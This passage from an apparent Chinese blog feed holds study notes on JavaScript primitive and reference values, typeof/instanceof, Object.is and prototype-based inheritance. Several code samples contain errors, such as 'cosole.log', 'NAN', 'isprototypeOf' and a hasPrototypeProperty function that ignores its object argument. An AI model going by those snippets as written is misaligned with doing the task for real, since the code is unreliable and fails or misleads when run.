    <content type="html"><![CDATA[<h1 id="原始值和引用值"><a href="#原始值和引用值" class="headerlink" title="原始值和引用值"></a>原始值和引用值</h1><p>ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。</p><p>引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="动态属性"><a href="#动态属性" class="headerlink" title="动态属性"></a>动态属性</h2><p>引用值可以随时添加，修改删除属性。</p><p>而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1=<span class="string">&quot;Nicholas&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> name2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;Matt&quot;</span>);</span><br><span class="line">name1.age=<span class="number">27</span>;</span><br><span class="line">name2.age=<span class="number">26</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name1.age);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(name2.age);<span class="comment">//26</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name1);<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name2);<span class="comment">//object</span></span><br></pre></td></tr></table></figure><h2 id="复制值"><a href="#复制值" class="headerlink" title="复制值"></a>复制值</h2><p>通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> num2=num1;</span><br></pre></td></tr></table></figure><p>num1和num2相互独立，num2是num1的副本</p><p>当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">let</span> obj2=obj1;</span><br><span class="line">obj1.name=<span class="string">&quot;Nic&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj2.name);<span class="comment">//Nic</span></span><br></pre></td></tr></table></figure><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTen</span>(<span class="params">num</span>)</span>&#123;<span class="comment">//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count</span></span><br><span class="line">    num+=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> res=addTen(count);</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//20，没有变化</span></span><br><span class="line"><span class="built_in">console</span>.log(res);<span class="comment">//30</span></span><br></pre></td></tr></table></figure><p>如果是对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">obj.name=<span class="string">&quot;Nic&quot;</span>；<span class="comment">//此时多了一个obj指针指向person,将name改为Nic</span></span><br><span class="line">    obj=<span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">//又创建一个指针，指向内存其他位置</span></span><br><span class="line">    obj.name=<span class="string">&quot;Greg&quot;</span>;<span class="comment">//函数调用结束，obj被销毁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setName(person);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//&#x27;Nic&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><p>typeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object</p><p>typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。</p><h1 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h1><p>如果变量是给定引用类型的实例，则instanceof操作符返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//变量person是Object吗</span></span><br></pre></td></tr></table></figure><p>按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。</p><h1 id="对象标识和相等判定"><a href="#对象标识和相等判定" class="headerlink" title="对象标识和相等判定"></a>对象标识和相等判定</h1><p>ES6之前：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(+<span class="number">0</span>===-<span class="number">0</span>);<span class="comment">//true</span></span><br><span class="line">cosole.log(NAN===NAN);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>ES6中的object.is()与===很像，但同时考虑了上述边界情形，这个方法接收两个参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(<span class="literal">true</span>,<span class="number">1</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(&#123;&#125;,&#123;&#125;));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(+<span class="number">0</span>,-<span class="number">0</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(NAN,NAN));<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>检查超过两个值是否相等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursiveEqual</span>(<span class="params">x,...rest</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.is(x,rest[<span class="number">0</span>])||(rest.length&lt;<span class="number">2</span>||recursiveEqual(...rest));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原始值和引用值&quot;&gt;&lt;a href=&quot;#原始值和引用值&quot; class=&quot;headerlink&quot; title=&quot;原始值和引用值&quot;&gt;&lt;/a&gt;原始值和引用值&lt;/h1&gt;&lt;p&gt;ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Unde</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>原型模式</title>
    <link href="https://coloey.github.io/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>https://coloey.github.io/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</id>
    <published>2022-04-13T14:03:03.000Z</published>
    <updated>2022-04-14T09:58:53.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>构造函数也是函数，与普通函数唯一区别就是调用方式不同。任何函数只要使用new操作符调用就是构造函数，而不适用new操作符调用的函数就是普通函数。</p><h1 id="理解原型"><a href="#理解原型" class="headerlink" title="理解原型"></a>理解原型</h1><p>只要创建一个函数，就会按照特定的规则为这个函数创建一个prototype属性（指向原型对象），默认情况下，所有原型对象会自动获得一个名为constructor指向Person</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">typeof</span> Person.prototype);</span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype);</span><br><span class="line">   <span class="comment">//正常原型链都会终止于Object的原型对象</span></span><br><span class="line">   <span class="comment">//Object原型的原型是null</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype.__proto__===<span class="built_in">Object</span>.prototype);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype.__proto__.constructor===<span class="built_in">Object</span>);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype.__proto__.__proto__===<span class="literal">null</span>);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype.__proto__);<span class="comment">//true</span></span><br><span class="line">   <span class="keyword">let</span> person1=<span class="keyword">new</span> Person(),person2=<span class="keyword">new</span> Person();</span><br><span class="line">   <span class="comment">//构造函数，原型对象和实例是3个完全不同的对象</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1!==Person);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1!==Person.prototype);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype!==Person);<span class="comment">//true</span></span><br><span class="line">   <span class="comment">//实例通过__proto__链接到原型对象，它实际上指向隐藏特性[[Prototype]]</span></span><br><span class="line">   <span class="comment">//实例与构造函数没有联系，与原型对象有直接联系</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1.__proto__===Person.prototype);</span><br><span class="line">   <span class="built_in">console</span>.log(person1.__proto__.constructor===Person);</span><br><span class="line">   <span class="comment">//同一个构造函数创建的两个实例共享同一个原型对象</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1.__proto__===person2.__proto__);</span><br><span class="line">   <span class="comment">//instanceof检查实例的原型链中是否包含指定构造函数的原型</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> Person);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//true</span></span><br><span class="line">   <span class="built_in">console</span>.log(Person.prototype <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/%E5%8E%9F%E5%9E%8B.png" alt="原型"></p><p>Person构造函数，Person原型对象和Person现有实例的关系如上：Person.prototype指向原型对象，因此Person.prototye.constructor指回Person构造函数。原型对象包含constructor属性和其他后来添加的属性。Person的两个实例person1,person2有一个内部属性指回Person.prototype,而且两者和构造函数没有直接联系。person1.sayName()可以正常调用，这是由于对象属性查找机制的原因</p><p>虽然不是所有实现都对外暴露[[Prototype]]，但可以使用isPrototypeOf()方法确定两个对象之间的关系，本质上isPrototypeOf()会在传入参数的[[Prototype]]指向调用它的对象时返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(Person.prototype.isprototypeOf(person1));<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isprototypeOf(person2));<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>Object类型有一个方法叫Object.getPrototypeOf(),返回参数的内部特性[[Prototype]]的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(person1)==Person.prototype);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(person1).name);</span><br></pre></td></tr></table></figure><p>使用Object.getPrototypeOf()可以取得一个对象的原型</p><p>Object类型还有一个setPrototypeOf()方法，可以向实例的私有特性[[Prototype]]写入一个新值，这样就可以重写一个对象的原型继承关系</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> biped=&#123;</span><br><span class="line">       <span class="attr">numLegs</span>:<span class="number">2</span></span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="keyword">let</span> person=&#123;</span><br><span class="line">       <span class="attr">name</span>:<span class="string">&#x27;Matt&#x27;</span></span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="built_in">Object</span>.setPrototypeOf(person,biped);</span><br><span class="line">   <span class="built_in">console</span>.log(person.name);</span><br><span class="line">   <span class="built_in">console</span>.log(person.numLegs);</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(person)===biped);</span><br></pre></td></tr></table></figure><p>Object.setPrototypeOf()可能会严重影响代码性能，会涉及所有访问了哪些修改过[[Prototype]]的对象的代码</p><p>可以通过Object.create()创建一个新对象，同时为其指定原型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> biped=&#123;</span><br><span class="line">    <span class="attr">numLegs</span>:<span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> person=<span class="built_in">Object</span>.create(biped);</span><br><span class="line">person.name=<span class="string">&#x27;Matt&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person.name);</span><br><span class="line"><span class="built_in">console</span>.log(person.numLegs);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(person)===biped);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><h1 id="原型层级"><a href="#原型层级" class="headerlink" title="原型层级"></a>原型层级</h1><p>通过对象访问属性时会按照这个属性名称开始搜索，搜索开始于对象实例本身，如果在实例上发现给定的名称，则返回该名称对应值，如果没有找到这个属性，则搜索会沿着指针进入原型对象，在原型对象找到属性后返回对应值。</p><p>比如foo不直接存在于myObject中而是存在于原型链上层时，myObject.foo=”bar”会出现三种情况：</p><ol><li><p>如果在[[Prototype]]链上层存在名为foo的普通数据访问属性，并且writable:true,那就会直接在myObject中添加一个名为foo的新属性，它是屏蔽属性</p></li><li><p>如果在[[Prototype]]链上层存在foo,但是它是被标记为只读(writable:false)，那么无法修改已有属性或者在myObject上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。不会发生屏蔽</p></li><li><p>如果在[[Prototype]]链上层存在foo并且它是一个setter，那就一定会调用这个setter,foo不会添加到myObject，也不会重新定义foo这个setter。</p></li></ol><p>当属性被屏蔽时，可以使用delete删除实例上的这个属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Person.prototype.name=<span class="string">&#x27;Nicholas&#x27;</span>;</span><br><span class="line">Person.prototype.age=<span class="number">29</span>;</span><br><span class="line"><span class="keyword">let</span> person1=<span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">let</span> person2=<span class="keyword">new</span> Person();</span><br><span class="line">person1.name=<span class="string">&quot;Greg&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person1.name);<span class="comment">//&quot;Greg&quot;,来自实例</span></span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//Nicholas,来自原型</span></span><br><span class="line"><span class="keyword">delete</span> person1.name;</span><br><span class="line"><span class="built_in">console</span>.log(person1.name);<span class="comment">//Nicholas,来自原型</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hasOwnProperty-NaN"><a href="#hasOwnProperty-NaN" class="headerlink" title="hasOwnProperty()"></a>hasOwnProperty()</h2><p>hasOwnProperty()方法用于确定某个属性是在实例上还是原型对象上。这个方法继承自Object，会在属性存在于调用它的对象实例善时返回true</p><p><img src="/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/image-20220414000115332-16498657088551.png" alt="image-20220414000115332"></p><h2 id="in操作符"><a href="#in操作符" class="headerlink" title="in操作符"></a>in操作符</h2><p>in操作符会在可以通过对象访问指定属性时返回true，无论该属性是在实例上还是在原型上</p><p>因此如果要确定某个属性是否在原型上可以同时使用hasOwnProperty()和in操作符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPrototypeProperty</span>(<span class="params">object,name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !<span class="built_in">Object</span>.hasOwnProperty(name)&amp;&amp;(name <span class="keyword">in</span> object)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="原型的问题"><a href="#原型的问题" class="headerlink" title="原型的问题"></a>原型的问题</h1><p>弱化了向构造函数传递初始化参数的能力，会导致所有实例默认取得属性相同的值，以及它的共享特性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Person.prototype=&#123;</span><br><span class="line">            <span class="attr">constructor</span>:Person,</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;nic&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">29</span>,</span><br><span class="line">            <span class="attr">job</span>:<span class="string">&quot;Software Engineer&quot;</span>,</span><br><span class="line">            <span class="attr">friends</span>:[<span class="string">&#x27;Coloey&#x27;</span>,<span class="string">&#x27;Amy&#x27;</span>],</span><br><span class="line">            <span class="function"><span class="title">sayName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> person1=<span class="keyword">new</span> Person();</span><br><span class="line">    <span class="keyword">let</span> person2=<span class="keyword">new</span> Person();</span><br><span class="line">    person1.friends.push(<span class="string">&#x27;Van&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(person1.friends===person2.friends);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p><strong>不同实例应有不同的副本</strong>。</p><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>原型链是ECMAScript的主要继承方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.property=<span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  SuperType.prototype.getSuperValue=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.property;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.subproperty=<span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//继承SuperType</span></span><br><span class="line">  SubType.prototype=<span class="keyword">new</span> SuperType();</span><br><span class="line">  SubType.prototype.getSubValue=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.subproperty;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> instance=<span class="keyword">new</span> SubType();</span><br><span class="line">  <span class="built_in">console</span>.log(instance.getSuperValue());<span class="comment">//true</span></span><br><span class="line">  <span class="built_in">console</span>.log(instance.property)<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/3.png" alt="3"></p><p>SubType.prototype是SuperType的实例，因此SubType.prototype指向SuperType.prototype,注意，getSuperValue()方法还在SuperType.prototype对象上，而property是一个实例属性，SubType.prototype是SuperType的实例，因此property存在它上面，由于SubType.peototype的constructor属性被重写指向SuperType,所以instance.constructor也指向SuperType.</p><h1 id="原型与继承关系"><a href="#原型与继承关系" class="headerlink" title="原型与继承关系"></a>原型与继承关系</h1><p>使用instanceOf操作符，如果一个实例的原型链出现过相应狗仔函数则instanceOf返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(instance <span class="keyword">instanceof</span> <span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">console</span>.loh(instance <span class="keyword">instanceof</span> SubType);</span><br></pre></td></tr></table></figure><p>使用isPrototypeOf()方法，原型链上的每个原型都可以调用这个方法，只要原型链上包含这个原型就返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.isPrototypeOf(instance));<span class="comment">//true</span></span><br><span class="line">    <span class="built_in">console</span>.log(SuperType.prototype.isPrototypeOf(instance));<span class="comment">//true</span></span><br><span class="line">    <span class="built_in">console</span>.log(SubType.prototype.isPrototypeOf(instance));<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>以对象字面量的方式创建原型方法会破坏之前的原型链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">        this.property=true;</span><br><span class="line">    &#125;</span><br><span class="line">    SuperType.prototype.getSuperValue=function()&#123;</span><br><span class="line">        return this.property;</span><br><span class="line">    &#125;</span><br><span class="line">    function SubType()&#123;</span><br><span class="line">        this.subproperty=false;</span><br><span class="line">    &#125;</span><br><span class="line">    //继承SuperType</span><br><span class="line">    SubType.prototype=new SuperType();</span><br><span class="line">//通过对象字面量添加新方法，会导致上一行无效</span><br><span class="line">  SubType.prototype=&#123;</span><br><span class="line">        getSubValue()&#123;</span><br><span class="line">            return this.subproperty;</span><br><span class="line">        &#125;,</span><br><span class="line">        someOtherMethod()&#123;</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    let instance=new SubType();</span><br><span class="line">    console.log(instance.getSuperValue());//出错</span><br></pre></td></tr></table></figure><p>原型链的问题就是会在原型中包含的引用值会在实例间共享。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.color=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>]</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   &#125;</span><br><span class="line">   SubType.prototype=<span class="keyword">new</span> SuperType();</span><br><span class="line">   <span class="keyword">let</span> intance1=<span class="keyword">new</span> SubType();</span><br><span class="line">   intance1.color.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">   <span class="built_in">console</span>.log(intance1.color);</span><br><span class="line">   <span class="keyword">let</span> instance2=<span class="keyword">new</span> SubType();</span><br><span class="line">   <span class="built_in">console</span>.log(instance2.color);</span><br></pre></td></tr></table></figure><h1 id="盗用构造函数"><a href="#盗用构造函数" class="headerlink" title="盗用构造函数"></a>盗用构造函数</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.color=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//继承SuperType</span></span><br><span class="line">        SuperType.call(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//SubType.prototype=new SuperType();</span></span><br><span class="line">    <span class="keyword">let</span> intance1=<span class="keyword">new</span> SubType();</span><br><span class="line">    intance1.color.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(intance1.color);</span><br><span class="line">    <span class="keyword">let</span> instance2=<span class="keyword">new</span> SubType();</span><br><span class="line">    <span class="built_in">console</span>.log(instance2.color);</span><br></pre></td></tr></table></figure><p>使用call()，SuperType构造函数在为SubType的实例创建的新对象的上下文中执行了，相当于新的SubType对象上运行了SuperType()函数的所有初始化代码</p><h2 id="传递参数："><a 